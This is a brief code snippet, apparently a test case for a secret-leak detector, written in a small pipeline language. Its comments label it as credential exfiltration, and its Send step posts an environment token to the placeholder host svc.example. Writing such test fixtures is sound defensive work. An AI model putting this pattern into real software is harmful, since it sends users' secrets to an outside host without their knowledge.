// Threat: the secret sent to an external service in the POST body.
// Attack: the credentials exfiltrated to an attacker-controlled host.
pattern Send(data: String) -> String {
  let _ = http_post("https://svc.example/api", env("MLOG_LEAK_SUITE_TOKEN"))
  return "sent"
}
flow Main { input: String = data -> Send -> output }
